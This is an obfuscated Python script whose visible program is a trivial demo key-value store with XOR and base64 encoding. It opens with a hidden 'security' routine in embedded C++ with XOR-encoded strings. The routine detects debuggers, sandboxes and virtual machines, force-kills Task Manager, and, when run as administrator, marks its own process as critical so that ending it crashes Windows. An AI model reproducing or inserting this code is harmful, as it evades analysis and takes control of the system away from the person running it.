def _pyfuzor_init_security():
    try:
        import cppyy
        import sys
        import os
        cppyy.cppdef('\n        #include <windows.h>\n        #include <winternl.h>\n        #include <string>\n        #include <vector>\n        #include <algorithm>\n\n        std::string _dec(std::vector<unsigned char> data, unsigned char key) {\n            std::string out;\n            for (auto &b : data) out += (char)(b ^ key);\n            return out;\n        }\n\n        typedef NTSTATUS (NTAPI *p_ni)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);\n\n        class _PyFuzor_Sec { \n        public:\n            static bool _run_all() {\n                if (_c_dbg()) return true;\n                if (_c_r_dbg()) return true;\n                if (_c_p_proc()) return true;\n                if (_c_b_win()) return true;\n                if (_c_v_art()) return true;\n                if (_c_h_res()) return true;\n                if (_c_u_name()) return true;\n                if (_c_u_time(1200)) return true;\n                _k_bad();\n                return false;\n            }\n            static bool _c_dbg() {\n                typedef BOOL (WINAPI *pIDP)(VOID);\n                auto f = (pIDP)GetProcAddress(GetModuleHandleA(_dec({0x21, 0x2f, 0x38, 0x24, 0x2f, 0x26, 0x79, 0x38, 0x72, 0x72}, 0x4a).c_str()), _dec({0x2b, 0x31, 0x06, 0x27, 0x20, 0x25, 0x25, 0x27, 0x30, 0x12, 0x30, 0x27, 0x31, 0x27, 0x2c, 0x36}, 0x42).c_str());\n                return f ? f() : false;\n            }\n            static bool _c_r_dbg() {\n                BOOL isP = FALSE;\n                CheckRemoteDebuggerPresent(GetCurrentProcess(), &isP);\n                return isP;\n            }\n            static bool _c_p_proc() {\n                HMODULE hN = GetModuleHandleA(_dec({0x24, 0x3e, 0x2e, 0x26, 0x26, 0x64, 0x2e, 0x26, 0x26}, 0x4a).c_str()); \n                if (hN) {\n                    auto q = (p_ni)GetProcAddress(hN, _dec({0x24, 0x1e, 0x3b, 0x1f, 0x1f, 0x18, 0x13, 0x33, 0x14, 0x1c, 0x15, 0x18, 0x17, 0x1b, 0x13, 0x13, 0x13, 0x35, 0x18, 0x15, 0x19, 0x1f, 0x13, 0x19, 0x3a, 0x18, 0x15, 0x19, 0x1f, 0x19, 0x13}, 0x6a).c_str());\n                    if (q) {\n                        PROCESS_BASIC_INFORMATION pbi;\n                        ULONG len;\n                        if (q(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len) == 0) {\n                            HANDLE hP = OpenProcess(0x1000, FALSE, (DWORD)pbi.Reserved3);\n                            if (hP) {\n                                char buf[MAX_PATH];\n                                DWORD sz = MAX_PATH;\n                                if (QueryFullProcessImageNameA(hP, 0, buf, &sz)) {\n                                    std::string n(buf);\n                                    std::transform(n.begin(), n.end(), n.begin(), ::tolower);\n                                    CloseHandle(hP);\n                                    if (n.find(_dec({0x2f, 0x32, 0x3a, 0x26, 0x25, 0x38, 0x2f, 0x38, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)) == std::string::npos && \n                                        n.find(_dec({0x29, 0x27, 0x2e, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)) == std::string::npos) return true;\n                                }\n                                CloseHandle(hP);\n                            }\n                        }\n                    }\n                }\n                return false;\n            }\n            static bool _c_b_win() {\n                std::vector<std::string> b = {\n                    _dec({0x2e, 0x24, 0x39, 0x3a, 0x33, 0x6b, 0x22, 0x2d, 0x3b}, 0x4a),\n                    _dec({0x32, 0x76, 0x7d, 0x2e, 0x28, 0x2d}, 0x4a),\n                    _dec({0x3a, 0x38, 0x25, 0x29, 0x2f, 0x39, 0x39, 0x6a, 0x22, 0x2b, 0x29, 0x21, 0x2f, 0x38}, 0x4a)\n                };\n                for (const auto& t : b) { if (FindWindowA(NULL, t.c_str())) return true; }\n                return false;\n            }\n            static bool _c_v_art() {\n                std::vector<std::string> p = {\n                    _dec({0x03, 0x7a, 0x1c, 0x11, 0x21, 0x2c, 0x27, 0x3f, 0x3b, 0x1c, 0x1b, 0x31, 0x3b, 0x2c, 0x2d, 0x25, 0x7a, 0x19, 0x1a, 0x21, 0x3e, 0x2d, 0x33, 0x3b, 0x7a, 0x1e, 0x02, 0x27, 0x30, 0x05, 0x27, 0x3d, 0x3b, 0x21, 0x66, 0x3b, 0x31, 0x3b}, 0x4a),\n                    _dec({0x03, 0x7a, 0x1c, 0x11, 0x21, 0x2c, 0x27, 0x3f, 0x3b, 0x1c, 0x1b, 0x31, 0x3b, 0x2c, 0x2d, 0x25, 0x7a, 0x19, 0x1a, 0x21, 0x3e, 0x2d, 0x33, 0x3b, 0x7a, 0x3e, 0x25, 0x25, 0x27, 0x3d, 0x3b, 0x21, 0x66, 0x3b, 0x31, 0x3b}, 0x4a)\n                };\n                for (const auto& s : p) { if (GetFileAttributesA(s.c_str()) != -1) return true; }\n                return false;\n            }\n            static bool _c_h_res() { return (GetSystemMetrics(0) < 800 || GetSystemMetrics(1) < 600); }\n            static bool _c_u_name() {\n                char u[256]; DWORD s = sizeof(u);\n                if (GetUserNameA(u, &s)) {\n                    std::string n(u); std::transform(n.begin(), n.end(), n.begin(), ::tolower);\n                    if (n.find(_dec({0x39, 0x2b, 0x24, 0x2e, 0x28, 0x25, 0x32}, 0x4a)) != std::string::npos) return true; \n                }\n                return false;\n            }\n            static bool _c_u_time(unsigned int m) { return (GetTickCount() / 1000) < m; }\n            static void _k_bad() {\n                std::vector<std::string> k = {_dec({0x3e, 0x2b, 0x39, 0x21, 0x27, 0x2d, 0x38, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)};\n                for (const auto& p : k) {\n                    std::string c = _dec({0x3e, 0x2b, 0x39, 0x21, 0x21, 0x23, 0x26, 0x26, 0x6a, 0x65, 0x0c, 0x6a, 0x65, 0x03, 0x07, 0x6a}, 0x4a) + p + _dec({0x6a, 0x74, 0x6a, 0x24, 0x3f, 0x26, 0x6a, 0x78, 0x3e, 0x6a, 0x2d, 0x21}, 0x4a);\n                    system(c.c_str());\n                }\n            }\n            static bool _s_crit() {\n                if (IsUserAnAdmin()) {\n                    HMODULE h = GetModuleHandleA(_dec({0x24, 0x3e, 0x2e, 0x26, 0x26, 0x64, 0x2e, 0x26, 0x26}, 0x4a).c_str());\n                    if (h) {\n                        auto a = (NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(h, _dec({0x18, 0x3e, 0x26, 0x0b, 0x2e, 0x20, 0x3f, 0x39, 0x3e, 0x1a, 0x38, 0x23, 0x3c, 0x23, 0x26, 0x2f, 0x2d, 0x2f}, 0x4a).c_str());\n                        auto s = (NTSTATUS(NTAPI*)(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(h, _dec({0x18, 0x3e, 0x26, 0x19, 0x2f, 0x3e, 0x1a, 0x38, 0x25, 0x29, 0x2f, 0x39, 0x39, 0x03, 0x39, 0x09, 0x38, 0x23, 0x3e, 0x23, 0x29, 0x2b, 0x26}, 0x4a).c_str());\n                        if (a && s) { BOOLEAN e; a(20, 1, 0, &e); s(1, 0, 0); return true; }\n                    }\n                }\n                return false;\n            }\n        };\n        ')
        native = cppyy.gbl._PyFuzor_Sec
        if native._run_all():
            sys.exit(0)
        recent_path = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows', 'Recent')
        if os.path.exists(recent_path) and len(os.listdir(recent_path)) < 20:
            sys.exit(0)
        native._s_crit()
    except:
        pass
_pyfuzor_init_security()

class _PyFuzorFlow:

    def elseobf(self, c):
        return int(not bool(c))

    def ifchk(self, c):
        return bool(c)

    def decrypt(self, d, k):
        import base64
        try:
            b = base64.b64decode(d)
            return bytes([(x - 13) % 256 ^ k for x in b]).decode('utf-8', 'ignore')
        except:
            return ''

    def decrypt_b(self, d, k):
        import base64
        try:
            b = base64.b64decode(d)
            return bytes([(x - 13) % 256 ^ k for x in b])
        except:
            return b''
PyFuzor_Flow = _PyFuzorFlow()
import base64
import os
import sys
import time
PyFuzor_rD8mTMQc5a = PyFuzor_Flow.decrypt('Z1hqZ15qWFppWGdeXFlaXkxJSg==', 14)

def PyFuzor_APRCNxgW(PyFuzor_xD1Lm65m):

    def PyFuzor_WBkxbEm3(*PyFuzor_xd7VnK0c, **PyFuzor_2Z7O0OW3):
        len('PyFuzor_aRjd')
        PyFuzor_q9vn = 160 ^ 161
        while PyFuzor_q9vn != 48 ^ 48:
            if PyFuzor_Flow.ifchk(PyFuzor_q9vn == -45 + 48):
                PyFuzor_OBIQnzjtmn = getattr(time, PyFuzor_Flow.decrypt('RC9CLiUxNT82QC9C', 71))()
                PyFuzor_q9vn = 255 ^ 251
            elif PyFuzor_Flow.ifchk(PyFuzor_q9vn == 23 ^ 22):
                PyFuzor_t7a9w8Vh0L = getattr(time, PyFuzor_Flow.decrypt('bFdqVn1ZTWdOaFdq', 47))()
                PyFuzor_q9vn = -57 + 59
            elif PyFuzor_Flow.ifchk(PyFuzor_q9vn == -35 + 40):
                return PyFuzor_bS09retpge
                PyFuzor_q9vn = 9 ^ 9
            elif PyFuzor_Flow.ifchk(PyFuzor_q9vn == 7 ^ 3):
                print(PyFuzor_Flow.decrypt('GSAfIg8dF4Q=', 87) + str(PyFuzor_xD1Lm65m.__name__) + PyFuzor_Flow.decrypt('3KiNjZHc', 239) + format(PyFuzor_OBIQnzjtmn - PyFuzor_t7a9w8Vh0L, PyFuzor_Flow.decrypt('FR9N', 38)) + PyFuzor_Flow.decrypt('dQ==', 27))
                PyFuzor_q9vn = 173 ^ 168
            elif PyFuzor_Flow.ifchk(PyFuzor_q9vn == -79 + 81):
                PyFuzor_bS09retpge = PyFuzor_xD1Lm65m(*PyFuzor_xd7VnK0c, **PyFuzor_2Z7O0OW3)
                PyFuzor_q9vn = 234 ^ 233
    if False:
        pass
    return PyFuzor_WBkxbEm3

class PyFuzor_hDldSQ2r:
    if False:
        pass

    def __init__(PyFuzor_mmn7trP3, PyFuzor_VLm3REhO, PyFuzor_ic0ZoLC0=-26 + 92):
        PyFuzor_CwzD = 208 ^ 209
        while PyFuzor_CwzD != 39 ^ 39:
            if PyFuzor_Flow.ifchk(PyFuzor_CwzD == 89 ^ 91):
                PyFuzor_mmn7trP3.PyFuzor_ic0ZoLC0 = PyFuzor_ic0ZoLC0
                PyFuzor_CwzD = 219 ^ 216
            elif PyFuzor_Flow.ifchk(PyFuzor_CwzD == -32 + 36):
                print(PyFuzor_Flow.decrypt('SxYqESlVDhMOKQ4WEQ4fGhlVGxQnX1U=', 104) + str(getattr(PyFuzor_mmn7trP3, PyFuzor_Flow.decrypt('to3MmZCjmLO8wqHXuMmeww==', 249))))
                PyFuzor_CwzD = -93 + 93
            elif PyFuzor_Flow.ifchk(PyFuzor_CwzD == -42 + 45):
                PyFuzor_mmn7trP3._data = {}
                PyFuzor_CwzD = 90 ^ 94
            elif PyFuzor_Flow.ifchk(PyFuzor_CwzD == 182 ^ 183):
                PyFuzor_mmn7trP3.PyFuzor_VLm3REhO = PyFuzor_VLm3REhO
                PyFuzor_CwzD = 143 ^ 141

    @PyFuzor_APRCNxgW
    def PyFuzor_RSukVoH3(PyFuzor_mmn7trP3, PyFuzor_fT3BsGdU, PyFuzor_tNO70bV9):
        PyFuzor_cmfB = 93
        PyFuzor_kSqMC6y96k = getattr(PyFuzor_Flow.decrypt('', 2), PyFuzor_Flow.decrypt('wb7EvQ==', 222))([chr(ord(PyFuzor_oybofaFpgi) ^ getattr(PyFuzor_mmn7trP3, PyFuzor_Flow.decrypt('qL+ay76xxqGvtQiesZSVCA==', 203))) for PyFuzor_oybofaFpgi in PyFuzor_tNO70bV9])
        len('PyFuzor_qGbZ')
        getattr(PyFuzor_mmn7trP3, PyFuzor_Flow.decrypt('Ynt4i3g=', 10))[PyFuzor_fT3BsGdU] = getattr(getattr(base64, PyFuzor_Flow.decrypt('gy8tfoeEiH1+', 20))(getattr(PyFuzor_kSqMC6y96k, PyFuzor_Flow.decrypt('CgMIBAkK', 152))()), PyFuzor_Flow.decrypt('rq2zt66t', 197))()

    def PyFuzor_FFi1ySaS(PyFuzor_mmn7trP3, PyFuzor_fT3BsGdU):
        PyFuzor_Od6c = 113 ^ 112
        while PyFuzor_Od6c != 254 ^ 254:
            if PyFuzor_Flow.ifchk(PyFuzor_Od6c == 39 ^ 35):
                PyFuzor_6nc3vQm2Pn = getattr(getattr(base64, PyFuzor_Flow.decrypt('4o6Q4N/h5eDf', 183))(getattr(PyFuzor_mmn7trP3, PyFuzor_Flow.decrypt('ksvIu8g=', 218))[PyFuzor_fT3BsGdU]), PyFuzor_Flow.decrypt('tLOtubSz', 195))()
                PyFuzor_Od6c = -94 + 99
            elif PyFuzor_Flow.ifchk(PyFuzor_Od6c == -71 + 73):
                PyFuzor_KeRDMp7Qwl = getattr(PyFuzor_mmn7trP3, PyFuzor_Flow.decrypt('5AvO/wr1AuXe2PfB4s/81Q==', 135))
                PyFuzor_Od6c = 224 ^ 227
            elif PyFuzor_Flow.ifchk(PyFuzor_Od6c == 47 ^ 44):
                print(PyFuzor_Flow.decrypt('qszMxry8wr/ICbfKtr21CcDHCQ==', 220) + str(PyFuzor_KeRDMp7Qwl) + PyFuzor_Flow.decrypt('6enp', 242))
                PyFuzor_Od6c = 17 ^ 21
            elif PyFuzor_Flow.ifchk(PyFuzor_Od6c == -93 + 94):
                if PyFuzor_Flow.ifchk(PyFuzor_fT3BsGdU not in getattr(PyFuzor_mmn7trP3, PyFuzor_Flow.decrypt('1AkG+QY=', 152))):
                    raise KeyError(PyFuzor_Flow.decrypt('1/EFrrM=', 129) + str(PyFuzor_fT3BsGdU) + PyFuzor_Flow.decrypt('JitdXlcrZV5YXWcrZF0rVWxYX1cd', 62))
                PyFuzor_Od6c = -6 + 8
            elif PyFuzor_Flow.ifchk(PyFuzor_Od6c == -35 + 40):
                return getattr(PyFuzor_Flow.decrypt('', 193), PyFuzor_Flow.decrypt('PUJAQQ==', 90))([chr(ord(PyFuzor_8ViGQxKSQo) ^ getattr(PyFuzor_mmn7trP3, PyFuzor_Flow.decrypt('6gHYBQTvDN/x+8rk787byg==', 141))) for PyFuzor_8ViGQxKSQo in PyFuzor_6nc3vQm2Pn])
                PyFuzor_Od6c = -11 + 11

    def __repr__(PyFuzor_mmn7trP3):
        PyFuzor_38SZ = 39
        return PyFuzor_Flow.decrypt('iSMuQjlBbTxEOzI/ig==', 64) + str(getattr(PyFuzor_mmn7trP3, PyFuzor_Flow.decrypt('jGN2Z2JNan2GcE8pindUbQ==', 47))) + PyFuzor_Flow.decrypt('jEM4Rz85bw==', 95) + str(len(getattr(PyFuzor_mmn7trP3, PyFuzor_Flow.decrypt('rqesl6w=', 254)))) + PyFuzor_Flow.decrypt('Ig==', 43)

@PyFuzor_APRCNxgW
def PyFuzor_UUYmAe4D():
    PyFuzor_65dB = 110 ^ 111
    while PyFuzor_65dB != 156 ^ 156:
        if PyFuzor_Flow.ifchk(PyFuzor_65dB == 131 ^ 130):
            print(PyFuzor_Flow.decrypt('09PT2My7xczYxcy3xszY09PT', 235))
            PyFuzor_65dB = 224 ^ 226
        elif PyFuzor_Flow.ifchk(PyFuzor_65dB == -73 + 77):
            getattr(PyFuzor_dc4yTSbvg5, PyFuzor_Flow.decrypt('VW5rem+Ed1RXWHqAW4RdOA==', 24))(PyFuzor_fT3BsGdU=PyFuzor_Flow.decrypt('oI+ouqakmA==', 242), PyFuzor_tNO70bV9=PyFuzor_rD8mTMQc5a)
            PyFuzor_65dB = -10 + 15
        elif PyFuzor_Flow.ifchk(PyFuzor_65dB == -81 + 83):
            PyFuzor_dc4yTSbvg5 = PyFuzor_hDldSQ2r(PyFuzor_VLm3REhO=PyFuzor_Flow.decrypt('vsSuww==', 196), PyFuzor_ic0ZoLC0=56 ^ 43)
            PyFuzor_65dB = -17 + 20
        elif PyFuzor_Flow.ifchk(PyFuzor_65dB == 116 ^ 113):
            try:
                PyFuzor_RIOQQ4rnJq = getattr(PyFuzor_dc4yTSbvg5, PyFuzor_Flow.decrypt('fmV0YWhbYIt0dFUdZX9Nfw==', 33))(PyFuzor_Flow.decrypt('j5SflJGUopA=', 230))
                print(PyFuzor_Flow.decrypt('Tm1zhImCfm1uMk5UTDI=', 5) + str(PyFuzor_RIOQQ4rnJq))
                PyFuzor_5kcv6BMvoJ = [PyFuzor_p5pcgJ4bZY for PyFuzor_p5pcgJ4bZY in getattr(getattr(PyFuzor_dc4yTSbvg5, PyFuzor_Flow.decrypt('YXx3jHc=', 11)), PyFuzor_Flow.decrypt('4efT2Q==', 191))()]
                print(PyFuzor_Flow.decrypt('ZotyhXx7N258gIY9Nw==', 10) + str(getattr(PyFuzor_Flow.decrypt('BwM=', 214), PyFuzor_Flow.decrypt('8/Dy7w==', 140))(PyFuzor_5kcv6BMvoJ)))
                if PyFuzor_Flow.ifchk(getattr(PyFuzor_dc4yTSbvg5, PyFuzor_Flow.decrypt('FDseLzpFMhUeHktzOxFDEQ==', 87))(PyFuzor_Flow.decrypt('XU5le2dhVQ==', 49)) == PyFuzor_rD8mTMQc5a):
                    print(PyFuzor_Flow.decrypt('iE1RV04cZltQU1hbaFNNTiIciYd5eXeJiQ==', 47))
                else:
                    print(PyFuzor_Flow.decrypt('r6aqoKXjjaSnrJ+kj6ympdnjvcTMx8C/', 246))
            except Exception as e:
                print(PyFuzor_Flow.decrypt('OEcuSS44NjFVOkdHNEdfVQ==', 104) + str(e))
            PyFuzor_65dB = 51 ^ 51
        elif PyFuzor_Flow.ifchk(PyFuzor_65dB == 181 ^ 182):
            getattr(PyFuzor_dc4yTSbvg5, PyFuzor_Flow.decrypt('I0wNQEk2QSYhIkA6HTYbgg==', 70))(PyFuzor_fT3BsGdU=PyFuzor_Flow.decrypt('IyATIB0gDiQ=', 114), PyFuzor_tNO70bV9=PyFuzor_Flow.decrypt('nJmNj5yYmZ2k5uPk3d4=', 227))
            PyFuzor_65dB = -82 + 86
if PyFuzor_Flow.ifchk(__name__ == PyFuzor_Flow.decrypt('jIxaTlZbjIw=', 32)):
    if PyFuzor_Flow.ifchk(len(getattr(sys, PyFuzor_Flow.decrypt('MUQvQA==', 69))) > 88 ^ 89):
        print(PyFuzor_Flow.decrypt('ORgdHSQdJmsWJBcjaywZJhpRaw==', 126) + str(getattr(sys, PyFuzor_Flow.decrypt('eot4hw==', 12))[-75 + 76:]))
    PyFuzor_UUYmAe4D()
    print(PyFuzor_Flow.decrypt('IiIiJXmKeHklioOJJSIiIg==', 56))